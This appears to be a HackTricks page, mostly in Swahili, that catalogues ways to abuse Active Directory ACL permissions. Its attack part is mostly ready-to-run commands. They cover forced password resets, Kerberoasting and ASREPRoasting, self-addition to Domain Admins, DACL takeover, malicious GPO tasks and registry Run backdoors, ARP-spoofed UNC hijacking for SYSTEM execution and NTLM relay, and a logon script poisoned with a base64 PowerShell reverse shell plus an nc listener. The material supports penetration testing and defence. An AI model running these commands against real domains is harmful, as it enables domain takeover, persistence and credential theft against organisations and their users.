# Kudhulumu Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Ukurasa huu kwa kiasi kikubwa ni muhtasari wa mbinu kutoka** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **na** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Kwa maelezo zaidi, angalia makala asili.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

Hii privilege humpa mshambuliaji udhibiti kamili juu ya akaunti ya mtumiaji lengwa. Mara tu rights za `GenericAll` zinapothibitishwa kwa kutumia amri `Get-ObjectAcl`, mshambuliaji anaweza:

- **Kubadilisha Password ya Lengwa**: Kwa kutumia `net user <username> <password> /domain`, mshambuliaji anaweza kuweka upya password ya mtumiaji.
- Kutoka Linux, unaweza kufanya kitu hichohicho kupitia SAMR kwa kutumia Samba `net rpc`:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Kama akaunti imezimwa, ondoa UAC flag**: `GenericAll` inaruhusu kuhariri `userAccountControl`. Kutoka Linux, BloodyAD inaweza kuondoa `ACCOUNTDISABLE` flag:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Weka SPN kwenye akaunti ya mtumiaji ili kuifanya iwe kerberoastable, kisha tumia Rubeus na targetedKerberoast.py kutoa na kujaribu kuvunja hashes za ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Zima pre-authentication kwa mtumiaji, na kufanya akaunti yake iwe rahisi kushambuliwa kwa ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Ukiwa na `GenericAll` kwenye user unaweza kuongeza credential ya msingi wa certificate na kujisajili kama wao bila kubadilisha password yao. Tazama:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll Rights on Group**

Haki hii inamruhusu attacker kubadili membership za group ikiwa ana `GenericAll` rights kwenye group kama `Domain Admins`. Baada ya kutambua `distinguished name` ya group kwa kutumia `Get-NetGroup`, attacker anaweza:

- **Kujiongeza kwenye Group ya Domain Admins**: Hii inaweza kufanywa kupitia direct commands au kwa kutumia modules kama Active Directory au PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Kutoka Linux unaweza pia kutumia BloodyAD kujiongeza kwenye groups za kiholela unapokuwa na GenericAll/Write membership juu yao. Ikiwa target group imewekwa ndani ya “Remote Management Users”, utaipata mara moja WinRM access kwenye hosts zinazoheshimu hiyo group:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Kuwa na privileges hizi kwenye object ya computer au user account huruhusu:

- **Kerberos Resource-based Constrained Delegation**: Huwezesha kuchukua udhibiti wa object ya computer.
- **Shadow Credentials**: Tumia technique hii kuiga computer au user account kwa kutumia privileges za kuunda shadow credentials.

## **WriteProperty on Group**

Ikiwa user ana `WriteProperty` rights kwenye objects zote kwa group fulani (k.m., `Domain Admins`), wanaweza:

- **Kujiongeza kwenye Group ya Domain Admins**: Inawezekana kupitia kuchanganya commands za `net user` na `Add-NetGroupUser`, njia hii huruhusu privilege escalation ndani ya domain.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) kwenye Group**

Haki hii inawawezesha washambuliaji kujiongeza wao wenyewe kwenye group maalum, kama `Domain Admins`, kupitia commands zinazo-manipulate group membership moja kwa moja. Kutumia sequence ifuatayo ya commands huruhusu self-addition:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Haki inayofanana, hii inaruhusu washambuliaji kujiongeza moja kwa moja kwenye groups kwa kurekebisha group properties ikiwa wana `WriteProperty` right kwenye hizo groups. Uthibitishaji na utekelezaji wa haki hii hufanywa kwa:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Kuwa na `ExtendedRight` kwa mtumiaji kwa `User-Force-Change-Password` kunaruhusu kuweka upya nywila bila kujua nywila ya sasa. Uthibitishaji wa haki hii na kuitekeleza unaweza kufanywa kupitia PowerShell au zana mbadala za command-line, zikitoa njia kadhaa za kuweka upya nywila ya mtumiaji, ikijumuisha interactive sessions na one-liners kwa mazingira ya non-interactive. Amri hizi zinaanzia kwenye invocations rahisi za PowerShell hadi kutumia `rpcclient` kwenye Linux, zikionyesha versatility ya attack vectors.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner kwenye Group**

Ikiwa mshambuliaji ataona kwamba ana haki za `WriteOwner` juu ya group, anaweza kubadilisha umiliki wa group hilo na kuuweka kwa ajili yake mwenyewe. Hii ina athari kubwa hasa group husika ikiwa ni `Domain Admins`, kwa kuwa kubadilisha umiliki kunaruhusu udhibiti mpana zaidi juu ya sifa za group na membership. Mchakato huu unahusisha kutambua object sahihi kupitia `Get-ObjectAcl` kisha kutumia `Set-DomainObjectOwner` kurekebisha owner, iwe kwa SID au name.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Ruhusa hii inamruhusu mshambuliaji kurekebisha sifa za mtumiaji. Kwa hakika, kwa ufikiaji wa `GenericWrite`, mshambuliaji anaweza kubadilisha njia ya logon script ya mtumiaji ili kutekeleza script hasidi wakati mtumiaji anapoingia. Hii inafanywa kwa kutumia amri ya `Set-ADObject` kusasisha property ya `scriptpath` ya mtumiaji lengwa ili ielekeze kwenye script ya mshambuliaji.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite kwenye Group**

Kwa privilege hii, attackers wanaweza ku-manipulate group membership, kama vile kujiongeza wao wenyewe au users wengine kwenye groups maalum. Mchakato huu unahusisha kuunda credential object, kuitumia kuongeza au kuondoa users kutoka kwenye group, na kuthibitisha mabadiliko ya membership kwa kutumia PowerShell commands.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Kutoka Linux, Samba `net` inaweza kuongeza/kuondoa wanachama unapokuwa na `GenericWrite` kwenye group (inafaa wakati PowerShell/RSAT hazipatikani):
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Kumiliki AD object na kuwa na ruhusa za `WriteDACL` juu yake humwezesha mshambuliaji kujipa ruhusa za `GenericAll` juu ya object hiyo. Hii inafanywa kupitia ADSI manipulation, ikiruhusu udhibiti kamili wa object na uwezo wa kurekebisha group memberships zake. Hata hivyo, kuna limitations wakati wa kujaribu kutumia vibaya ruhusa hizi kwa kutumia cmdlets za Active Directory module `Set-Acl` / `Get-Acl`.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner quick takeover (PowerView)

Unapokuwa na `WriteOwner` na `WriteDacl` juu ya user au service account, unaweza kuchukua udhibiti kamili na kuweka upya password yake kwa kutumia PowerView bila kujua password ya zamani:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Kumbuka:
- Huenda ukahitaji kwanza kubadili owner kuwa wewe mwenyewe ikiwa una `WriteOwner` tu:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Thibitisha access kwa itifaki yoyote (SMB/LDAP/RDP/WinRM) baada ya password reset.

## **Replication kwenye Domain (DCSync)**

Shambulio la DCSync hutumia specific replication permissions kwenye domain kuiga Domain Controller na ku-synchronize data, ikijumuisha user credentials. Technique hii yenye nguvu inahitaji permissions kama `DS-Replication-Get-Changes`, ikiruhusu attackers kutoa sensitive information kutoka kwenye AD environment bila access ya moja kwa moja kwa Domain Controller. [**Jifunze zaidi kuhusu shambulio la DCSync hapa.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Access iliyokabidhiwa ya kusimamia Group Policy Objects (GPOs) inaweza kuleta security risks kubwa. Kwa mfano, ikiwa user kama `offense\spotless` amepewa delegated GPO management rights, anaweza kuwa na privileges kama **WriteProperty**, **WriteDacl**, na **WriteOwner**. Permissions hizi zinaweza abused kwa madhumuni ya malicious, kama ilivyotambuliwa kwa kutumia PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerate GPO Permissions

Ili kutambua GPOs zilizosanidiwa vibaya, cmdlets za PowerSploit zinaweza ku-chain pamoja. Hii inaruhusu kugundua GPOs ambazo user fulani ana permissions za kuzisimamia: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: Inawezekana kubaini ni computers zipi ambazo GPO fulani inatumika kwao, kusaidia kuelewa scope ya potential impact. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: Ili kuona policies zipi zinatumika kwa computer fulani, commands kama `Get-DomainGPO` zinaweza kutumika.

**OUs with a Given Policy Applied**: Kutambua organizational units (OUs) zilizoathiriwa na policy fulani kunaweza kufanywa kwa kutumia `Get-DomainOU`.

Unaweza pia kutumia tool [**GPOHound**](https://github.com/cogiceo/GPOHound) ku-enumerate GPOs na kupata issues ndani yake.

### Abuse GPO - New-GPOImmediateTask

GPOs zilizosanidiwa vibaya zinaweza kutumiwa ku-execute code, kwa mfano, kwa kuunda immediate scheduled task. Hii inaweza kufanywa ili kumwongeza user kwenye local administrators group kwenye machines zilizoathiriwa, hivyo kuongeza privileges kwa kiwango kikubwa:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy module, ikiwa imewekwa, huruhusu uundaji na uunganishaji wa GPOs mpya, na kuweka preferences kama registry values ili kutekeleza backdoors kwenye kompyuta zilizoathiriwa. Njia hii inahitaji GPO kusasishwa na mtumiaji kuingia kwenye kompyuta ili utekelezaji ufanyike:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Tumia vibaya GPO

SharpGPOAbuse inatoa njia ya kutumia vibaya GPO zilizopo kwa kuongeza tasks au kurekebisha settings bila hitaji la kuunda GPO mpya. Tool hii inahitaji kurekebisha GPO zilizopo au kutumia RSAT tools kuunda mpya kabla ya kutumia mabadiliko:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Force Policy Update

Mara kwa mara masasisho ya GPO hutokea takriban kila dakika 90. Ili kuharakisha mchakato huu, hasa baada ya kutekeleza mabadiliko, amri `gpupdate /force` inaweza kutumika kwenye kompyuta lengwa ili kulazimisha sasisho la sera la papo hapo. Amri hii huhakikisha kwamba marekebisho yoyote kwenye GPOs yanatumika bila kusubiri mzunguko unaofuata wa sasisho la kiotomatiki.

### Under the Hood

Baada ya kukagua Scheduled Tasks za GPO fulani, kama `Misconfigured Policy`, kuongezwa kwa tasks kama `evilTask` kunaweza kuthibitishwa. Tasks hizi huundwa kupitia scripts au command-line tools zinazolenga kurekebisha tabia ya mfumo au kuongeza privileges.

Muundo wa task, kama unavyoonyeshwa kwenye faili ya usanidi ya XML inayozalishwa na `New-GPOImmediateTask`, unaeleza maelezo ya scheduled task - ikijumuisha command itakayotekelezwa na triggers zake. Faili hii inaonyesha jinsi scheduled tasks hufafanuliwa na kusimamiwa ndani ya GPOs, ikitoa njia ya kutekeleza arbitrary commands au scripts kama sehemu ya utekelezaji wa policy.

### Users and Groups

GPOs pia huruhusu kuendesha mabadiliko ya uanachama wa users na groups kwenye mifumo lengwa. Kwa kuhariri moja kwa moja faili za policy za Users and Groups, washambuliaji wanaweza kuongeza users kwenye privileged groups, kama vile local `administrators` group. Hili linawezekana kupitia delegation ya GPO management permissions, ambayo huruhusu urekebishaji wa faili za policy ili kujumuisha users wapya au kubadilisha uanachama wa groups.

Faili ya usanidi ya XML kwa Users and Groups inaeleza jinsi mabadiliko haya yanavyotekelezwa. Kwa kuongeza entries kwenye faili hii, users mahususi wanaweza kupewa elevated privileges kwenye mifumo iliyoathiriwa. Njia hii inatoa mbinu ya moja kwa moja ya privilege escalation kupitia urekebishaji wa GPO.

Zaidi ya hayo, mbinu za ziada za kutekeleza code au kudumisha persistence, kama vile kutumia logon/logoff scripts, kurekebisha registry keys kwa autoruns, kusakinisha software kupitia faili za .msi, au kuhariri usanidi wa services, zinaweza pia kuzingatiwa. Mbinu hizi hutoa njia mbalimbali za kudumisha access na kudhibiti mifumo lengwa kupitia abuse ya GPOs.

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` kupitia OU/domain hukuruhusu kurekebisha `gPLink` attribute ya container lengwa na **kuforce existing GPO itumike** bila kuhariri GPO yenyewe. Hili huwa la kuvutia pale GPO iliyo-link tayari inaporejelea remote content kupitia **UNC paths** (`\\HOST\share\...`), kwa sababu authenticated users wanaweza kusoma **SYSVOL** na kutafuta reusable policies offline.

High-level workflow:

1. Tumia BloodHound kutambua principal mwenye `WriteGPLink` juu ya OU na kuorodhesha computers/users ndani ya OU hiyo.
2. Nakili `SYSVOL` kwa mode ya read-only na changanua GPOs ukitafuta **Software Installation**, **drive mappings** (`Drives.xml`), na **logon/startup scripts** zinazorejelea UNC paths.
3. Pendelea policies zinazoelekeza kwenye **direct hostname** (kwa mfano `\\DC02\share\pkg.msi`) badala ya DFS/domain-namespace paths, kwa sababu hostname-based paths ni rahisi zaidi kuelekeza upya kwa L2 spoofing.
4. Ongeza GPO GUID iliyochaguliwa kwenye `gPLink` ya target OU ili victim achakata policy hiyo iliyokuwapo tayari.
5. Kwenye broadcast domain ile ile, fanya ARP spoof ya UNC host na unganishe IP yake locally (`ip addr add <target_ip>/32 dev <iface>`) ili SMB traffic ya victim ifike kwenye host yako.
6. Hudumia path/filename inayotarajiwa kutoka kwa attacker SMB server (kwa mfano `smbserver.py`) na subiri normal policy processing.

Mfano wa ukusanyaji wa `SYSVOL` na uhusiano wa GPO:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Unganisha GPO iliyopo kwa target OU:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

Ikiwa GPO iliyounganishwa inasambaza MSI kutoka kwa njia ya UNC, client ataichukua wakati wa **computer startup** na kuiinstall kama **`NT AUTHORITY\SYSTEM`**. Kwa kuiga host iliyoreferensiwa na kuhudumia MSI hasidi chini ya **same share/path/name**, unaweza kugeuza `WriteGPLink` kuwa SYSTEM code execution **bila kurekebisha SYSVOL**.

Vizuizi muhimu:

- **Timing matters**: link mpya huonekana wakati wa policy refresh (kwa kawaida ~90 minutes), lakini **Software Installation** kawaida huanza kwenye **reboot**.
- Windows Installer mara nyingi hufuatilia deployment kwa kutumia **`ProductCode`** ya package. Ikiwa product tayari imeinstallwa, deployment inaweza kurukwa.
- Ili kuepuka installer rejection, rekebisha MSI ya rogue ili **`ProductCode`** na **`PackageCode`** zake zilingane na package halali inayotarajiwa na GPO.
- Faili za zamani za `.aas` advertisement zinaweza kubaki ndani ya `SYSVOL`, hivyo thibitisha kwamba deployment bado inaonekana active kabla ya kuitegemea.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

GPP drive mappings in `Drives.xml` husababisha users kujithibitisha kwenye configured UNC path wakati wa logon au reconnection. Uki spoof host iliyoreferenced, unaweza capture **NetNTLMv2**. Ikiwa SMB imefanywa kimakusudi ishindwe, Windows inaweza kujaribu tena kupitia **WebDAV**, ikituma **NTLM over HTTP**, ambayo ni flexible zaidi kwa relays kwenda **LDAP(S)**, **AD CS**, au **SMB**.

#### Logon/startup script UNC hijack

Mfumo huo huo unatumika kwa UNC-hosted scripts zilizogunduliwa katika `SYSVOL`:

- **Logon scripts** kawaida hu-execute katika **user** context.
- **Startup scripts** kawaida hu-execute katika **computer / SYSTEM** context.

Ikiwa script path inaelekeza kwenye spoofable hostname, redirect UNC host na serve replacement script content kutoka kwenye expected location.

## SYSVOL/NETLOGON Logon Script Poisoning

Writable paths chini ya `\\<dc>\SYSVOL\<domain>\scripts\` au `\\<dc>\NETLOGON\` huruhusu tampering na logon scripts zinazotekelezwa wakati wa user logon kupitia GPO. Hii inaleta code execution katika security context ya users wanaologin.

### Locate logon scripts
- Inspect user attributes for a configured logon script:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Crawl domain shares ili kuibua shortcuts au references kwa scripts:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Parse `.lnk` files to resolve targets pointing into SYSVOL/NETLOGON (trick muhimu ya DFIR na kwa washambuliaji bila direct GPO access):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound huonyesha sifa ya `logonScript` (scriptPath) kwenye nodi za user inapokuwepo.

### Thibitisha write access (usiwaamini share listings)
Vifaa vya automated vinaweza kuonyesha SYSVOL/NETLOGON kama read-only, lakini NTFS ACLs za msingi bado zinaweza kuruhusu writes. Daima test:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Ikiwa ukubwa wa faili au mtime hubadilika, una write. Hifadhi originals kabla ya kurekebisha.

### Poison a VBScript logon script for RCE
Ongeza command inayozindua PowerShell reverse shell (tengeneza kutoka revshells.com) na uhifadhi original logic ili usivunje business function:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Sikiliza kwenye host yako na usubiri logon shirikishi inayofuata:
```bash
rlwrap -cAr nc -lnvp 443
```
Notes:
- Execution hutokea chini ya token ya mtumiaji anayeweka logging (si SYSTEM). Scope ni GPO link (OU, site, domain) inayotumia hiyo script.
- Safisha kwa kurejesha content/timestamps asili baada ya matumizi.


## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
